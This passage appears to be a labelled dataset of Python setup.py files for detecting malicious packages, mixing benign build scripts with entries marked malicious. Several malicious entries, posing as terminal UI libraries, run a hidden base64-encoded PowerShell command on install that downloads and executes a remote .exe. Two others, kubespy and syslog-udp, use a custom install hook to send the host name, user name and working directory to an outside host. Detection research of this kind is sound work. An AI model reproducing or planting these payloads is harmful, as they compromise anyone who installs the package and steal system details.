(universal) distribution\u2026\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPI via Twine\u2026\")\n        os.system(\"twine upload dist/*\")\n\n        self.status(\"Pushing git tags\u2026\")\n        os.system(\"git tag v{0}\".format(about[\"__version__\"]))\n        os.system(\"git push --tags\")\n\n        sys.exit()\n\n\nsetup(\n    name=NAME,\n    version=about[\"__version__\"],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=(\"tests\",)),\n    install_requires=REQUIRED,\n    extras_require={\"dev\": DEV_REQUIRED},\n    include_package_data=True,\n    license=\"MIT\",\n    keywords=\"airflow\",\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    # $ setup.py publish support.\n    cmdclass={\"upload\": UploadCommand},\n)\n", "target": 0}
{"idx": "esqguiadgrand-7.93", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguiadgrand',\n    packages = ['modlib'],\n    version = '8.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "kubespy-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='kubespy', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n", "target": 1}
{"idx": "grpcio-status-1.47.0", "func": "# Copyright 2018 The gRPC Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Setup module for the GRPC Python package's status mapping.\"\"\"\n\nimport os\n\nimport setuptools\n\n_PACKAGE_PATH = os.path.realpath(os.path.dirname(__file__))\n_README_PATH = os.path.join(_PACKAGE_PATH, 'README.rst')\n\n# Ensure we're in the proper directory whether or not we're being used by pip.\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\n\n# Break import-style to ensure we can actually find our local modules.\nimport grpc_version\n\n\nclass _NoOpCommand(setuptools.Command):\n    \"\"\"No-op command.\"\"\"\n\n    description = ''\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        pass\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'License :: OSI Approved :: Apache Software License',\n]\n\nPACKAGE_DIRECTORIES = {\n    '': '.',\n}\n\nINSTALL_REQUIRES = (\n    'protobuf>=3.12.0',\n    'grpcio>={version}'.format(version=grpc_version.VERSION),\n    'googleapis-common-protos>=1.5.5',\n)\n\ntry:\n    import status_commands as _status_commands\n\n    # we are in the build environment, otherwise the above import fails\n    COMMAND_CLASS = {\n        # Run preprocess from the repository *before* doing any packaging!\n        'preprocess': _status_commands.Preprocess,\n        'build_package_protos': _NoOpCommand,\n    }\nexcept ImportError:\n    COMMAND_CLASS = {\n        # wire up commands to no-op not to break the external dependencies\n        'preprocess': _NoOpCommand,\n        'build_package_protos': _NoOpCommand,\n    }\n\nsetuptools.setup(name='grpcio-status',\n                 version=grpc_version.VERSION,\n                 description='Status proto mapping for gRPC',\n                 long_description=open(_README_PATH, 'r').read(),\n                 author='The gRPC Authors',\n                 author_email='grpc-io@googlegroups.com',\n                 url='https://grpc.io',\n                 license='Apache License 2.0',\n                 classifiers=CLASSIFIERS,\n                 package_dir=PACKAGE_DIRECTORIES,\n                 packages=setuptools.find_packages('.'),\n                 python_requires='>=3.6',\n                 install_requires=INSTALL_REQUIRES,\n                 cmdclass=COMMAND_CLASS)\n", "target": 0}
{"idx": "glfw-2.5.4", "func": "from setuptools import setup\nimport os.path\n\nsetup_directory = os.path.abspath(os.path.dirname(__file__))\n\nwith open(os.path.join(setup_directory, 'README.rst')) as readme_file:\n    long_description = readme_file.read()\n\nsetup(\n    name='glfw',\n    version='2.5.4',\n    description='A ctypes-based wrapper for GLFW3.',\n    long_description=long_description,\n    url='https://github.com/FlorianRhiem/pyGLFW',\n    author='Florian Rhiem',\n    author_email='florian.rhiem@gmail.com',\n    license='MIT',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: MacOS X',\n        'Environment :: X11 Applications',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Topic :: Multimedia :: Graphics',\n        'Topic :: Scientific/Engineering :: Visualization',\n    ],\n    packages=['glfw'],\n    package_data={\n        # include GLFW shared library and Visual C++ runtimes in wheel package\n        'glfw': [\n            'glfw3.dll',\n            'libglfw.3.dylib',\n            'wayland/libglfw.so',\n            'x11/libglfw.so',\n            'libglfw.so',\n            'msvcr100.dll',\n            'msvcr110.dll',\n        ]\n    },\n    extras_require={\n        'preview': ['glfw_preview']\n    }\n)\n", "target": 0}
{"idx": "h5py-3.7.0", "func": "#!/usr/bin/env python\n\n\"\"\"\n    This is the main setup script for h5py (http://www.h5py.org).\n\n    Most of the functionality is provided in two separate modules:\n    setup_configure, which manages compile-time/Cython-time build options\n    for h5py, and setup_build, which handles the actual compilation process.\n\"\"\"\n\nfrom setuptools import Extension, setup\nimport sys\nimport os\n\n# Newer packaging standards may recommend removing the current dir from the\n# path, add it back if needed.\nif '' not in sys.path:\n    sys.path.insert(0, '')\n\nimport setup_build, setup_configure\n\n\nVERSION = '3.7.0'\n\n\n# these are required to use h5py\nRUN_REQUIRES = [\n    # We only really aim to support NumPy & Python combinations for which\n    # there are wheels on PyPI (e.g. NumPy >=1.17.5 for Python 3.8).\n    # But we don't want to duplicate the information in oldest-supported-numpy\n    # here, and if you can build an older NumPy on a newer Python, h5py probably\n    # works (assuming you build it from source too).\n    # NumPy 1.14.5 is the first with wheels for Python 3.7, our minimum Python.\n    \"numpy >=1.14.5\",\n]\n\n# Packages needed to build h5py (in addition to static list in pyproject.toml)\n# For packages we link to (numpy, mpi4py), we build against the oldest\n# supported version; h5py wheels should then work with newer versions of these.\n# Downstream packagers - e.g. Linux distros - can safely build with newer\n# versions.\n# TODO: setup_requires is deprecated in setuptools.\nSETUP_REQUIRES = []\n\nif setup_configure.mpi_enabled():\n    RUN_REQUIRES.append('mpi4py >=3.0.2')\n    SETUP_REQUIRES.append(\"mpi4py ==3.0.2; python_version<'3.8'\")\n    SETUP_REQUIRES.append(\"mpi4py ==3.0.3; python_version=='3.8.*'\")\n    SETUP_REQUIRES.append(\"mpi4py ==3.1.0; python_version>='3.9'\")\n\n# Set the environment variable H5PY_SETUP_REQUIRES=0 if we need to skip\n# setup_requires for any reason.\nif os.environ.get('H5PY_SETUP_REQUIRES', '1') == '0':\n    SETUP_REQUIRES = []\n\n# --- Custom Distutils commands -----------------------------------------------\n\nCMDCLASS = {'build_ext': setup_build.h5py_build_ext}\n\n\n# --- Distutils setup and metadata --------------------------------------------\n\ncls_txt = \\\n\"\"\"\nDevelopment Status :: 5 - Production/Stable\nIntended Audience :: Developers\nIntended Audience :: Information Technology\nIntended Audience :: Science/Research\nLicense :: OSI Approved :: BSD License\nProgramming Language :: Cython\nProgramming Language :: Python\nProgramming Language :: Python :: 3\nProgramming Language :: Python :: Implementation :: CPython\nTopic :: Scientific/Engineering\nTopic :: Database\nTopic :: Software Development :: Libraries :: Python Modules\nOperating System :: Unix\nOperating System :: POSIX :: Linux\nOperating System :: MacOS :: MacOS X\nOperating System :: Microsoft :: Windows\n\"\"\"\n\nshort_desc = \"Read and write HDF5 files from Python\"\n\nlong_desc = \\\n\"\"\"\nThe h5py package provides both a high- and low-level interface to the HDF5\nlibrary from Python. The low-level interface is intended to be a complete\nwrapping of the HDF5 API, while the high-level component supports  access to\nHDF5 files, datasets and groups using established Python and NumPy concepts.\n\nA strong emphasis on automatic conversion between Python (Numpy) datatypes and\ndata structures and their HDF5 equivalents vastly simplifies the process of\nreading and writing data from Python.\n\nSupports HDF5 versions 1.8.4 and higher.  On Windows, HDF5 is included with\nthe installer.\n\"\"\"\n\npackage_data = {'h5py': [], \"h5py.tests.data_files\": [\"*.h5\"]}\nif os.name == 'nt':\n    package_data['h5py'].append('*.dll')\n\nsetup(\n  name = 'h5py',\n  version = VERSION,\n  description = short_desc,\n  long_description = long_desc,\n  classifiers = [x for x in cls_txt.split(\"\\n\") if x],\n  author = 'Andrew Collette',\n  author_email = 'andrew.collette@gmail.com',\n  maintainer = 'Andrew Collette',\n  maintainer_email = 'andrew.collette@gmail.com',\n  license = 'BSD',\n  url = 'http://www.h5py.org',\n  project_urls = {\n      'Source': 'https://github.com/h5py/h5py',\n  },\n  download_url = 'https://pypi.python.org/pypi/h5py',\n  packages = [\n      'h5py',\n      'h5py._hl',\n      'h5py.tests',\n      'h5py.tests.data_files',\n      'h5py.tests.test_vds',\n  ],\n  package_data = package_data,\n  ext_modules = [Extension('h5py.x',['x.c'])],  # To trick build into running build_ext\n  install_requires = RUN_REQUIRES,\n  setup_requires = SETUP_REQUIRES,\n  python_requires='>=3.7',\n  cmdclass = CMDCLASS,\n)\n", "target": 0}
{"idx": "h2o-3.36.1.4", "func": "# -*- encoding: utf-8 -*-\nfrom setuptools import setup, find_packages\nfrom codecs import open\nimport os\nimport sys\nimport shutil\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Get the long description from the relevant file\nwith open(os.path.join(here, 'DESCRIPTION.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nversion = \"0.0.local\"\n# Get the version from the relevant file\nwith open(os.path.join(here, 'h2o/version.txt'), encoding='utf-8') as f:\n    version = f.read()\n\nclient = \"--client\" in sys.argv\nif client:\n    sys.argv.remove(\"--client\")\n\npackages = find_packages(exclude=[\"tests*\"])\nprint(\"Found packages: %r\" % packages)\n\nsetup(\n    name='h2o_client' if client else 'h2o',\n\n    # Versions should comply with PEP440.  For a discussion on single-sourcing\n    # the version across setup.py and the project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version = version,\n\n    description='H2O, Fast Scalable Machine Learning, for python ',\n    long_description=long_description,\n\n    # The project's main homepage.\n    url='https://github.com/h2oai/h2o-3.git',\n\n    # Author details\n    author='H2O.ai',\n    author_email='support@h2o.ai',\n\n    # Choose your license\n    license='Apache v2',\n\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        \"Development Status :: 5 - Production/Stable\",\n\n        # Indicate who your project is intended for\n        \"Intended Audience :: Education\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Intended Audience :: Customer Service\",\n        \"Intended Audience :: Financial and Insurance Industry\",\n        \"Intended Audience :: Healthcare Industry\",\n        \"Intended Audience :: Telecommunications Industry\",\n        \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n        \"Topic :: Scientific/Engineering :: Information Analysis\",\n\n        # Pick your license as you wish (should match \"license\" above)\n        \"License :: OSI Approved :: Apache Software License\",\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n    ],\n\n    keywords='machine learning, data mining, statistical analysis, modeling, big data, distributed, parallel',\n\n    packages=packages,\n    package_data={\"h2o\": [\n        \"h2o_data/*.*\",     # several small datasets used in demos/examples\n        \"backend/bin/*.*\",  # h2o.jar core Java library\n        \"version.txt\",      # version file\n        \"buildinfo.txt\"     # buildinfo file\n    ]},\n\n    # run-time dependencies\n    install_requires=[\"requests\", \"tabulate\", \"future\"],\n\n    # optional dependencies\n    extras_require={\n        \"kerberos\": [\n            \"gssapi\",\n            \"pykerberos >= 1.1.8, < 2.0.0; sys.platform != 'win32'\",\n            \"winkerberos >= 0.5.0; sys.platform == 'win32'\"\n        ]\n    }\n)\n", "target": 0}
{"idx": "selfencodetoolcpu-10.87", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfencodetoolcpu',\n    packages = ['modlib'],\n    version = '7.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "getpip-5.37", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'getpip',\n    packages = ['modlib'],\n    version = '6.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "elasticsearch-dbapi-0.2.9", "func": "import io\nimport os\n\nfrom setuptools import find_packages, setup\n\nVERSION = \"0.2.9\"\nBASE_DIR = os.path.abspath(os.path.dirname(__file__))\n\nwith io.open(\"README.md\", \"r\", encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"elasticsearch-dbapi\",\n    description=(\"A DBAPI and SQLAlchemy dialect for Elasticsearch\"),\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    version=VERSION,\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    entry_points={\n        \"sqlalchemy.dialects\": [\n            \"elasticsearch = es.elastic.sqlalchemy:ESHTTPDialect\",\n            \"elasticsearch.http = es.elastic.sqlalchemy:ESHTTPDialect\",\n            \"elasticsearch.https = es.elastic.sqlalchemy:ESHTTPSDialect\",\n            \"odelasticsearch = es.opendistro.sqlalchemy:ESHTTPDialect\",\n            \"odelasticsearch.http = es.opendistro.sqlalchemy:ESHTTPDialect\",\n            \"odelasticsearch.https = es.opendistro.sqlalchemy:ESHTTPSDialect\",\n        ]\n    },\n    install_requires=[\"elasticsearch>7, <7.14\", \"packaging>=21.0, <22.0\", \"sqlalchemy\"],\n    extras_require={\"opendistro\": [\"requests_aws4auth\", \"boto3\"]},\n    author=\"Preset Inc.\",\n    author_email=\"daniel@preset.io\",\n    url=\"http://preset.io\",\n    download_url=\"https://github.com/preset-io/elasticsearch-dbapi/releases/tag/\"\n    + VERSION,\n    classifiers=[\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    tests_require=[\"nose>=1.0\"],\n    test_suite=\"nose.collector\",\n)\n", "target": 0}
{"idx": "libsplitosint-1.83", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libsplitosint',\n    packages = ['modlib'],\n    version = '7.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cpuvm-8.5", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cpuvm',\n    packages = ['modlib'],\n    version = '4.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libsuperhydrainfo-5.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libsuperhydrainfo',\n    packages = ['modlib'],\n    version = '5.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "erlang_py-2.0.4", "func": "#-*-Mode:python;coding:utf-8;tab-width:4;c-basic-offset:4;indent-tabs-mode:()-*-\n# ex: set ft=python fenc=utf-8 sts=4 ts=4 sw=4 et:\n\ntry:\n    from setuptools import setup, Command\nexcept ImportError:\n    from distutils.core import setup, Command\n\nclass PyTest(Command):\n    user_options = []\n    def initialize_options(self):\n        pass\n    def finalize_options(self):\n        pass\n    def run(self):\n        import tests.erlang_tests\n        import unittest\n        suite = unittest.TestSuite()\n        suite.addTests(tests.erlang_tests.get_suite())\n        unittest.TextTestRunner().run(suite)\n\nlong_description = open('README.rst', 'r').read()\nsetup(\n    name='erlang_py',\n    py_modules=['erlang'],\n    cmdclass={'test': PyTest},\n    license='MIT',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Erlang',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: System :: Distributed Computing',\n    ],\n    version='2.0.4',\n    description='Erlang Binary Term Format for Python',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Michael Truog',\n    author_email='mjtruog@protonmail.com',\n    url='https://github.com/okeuday/erlang_py',\n)\n", "target": 0}
{"idx": "syslog-udp-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='syslog-udp', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n", "target": 1}
{"idx": "discord-webhook-0.16.3", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nwith open(os.path.join(os.path.dirname(__file__), \"README.md\")) as readme:\n    README = readme.read()\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name=\"discord-webhook\",\n    version=\"0.16.3\",\n    packages=find_packages(),\n    include_package_data=True,\n    license=\"MIT License\",\n    description=\"execute discord webhooks\",\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/lovvskillz/python-discord-webhook\",\n    install_requires=[\n        \"requests>=2.19.1\",\n    ],\n    author=\"Vadim Zifra\",\n    author_email=\"vadim@minehub.de\",\n    extras_require={\n        'async': [\n            'httpx>=0.20.0'\n        ]\n    },\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 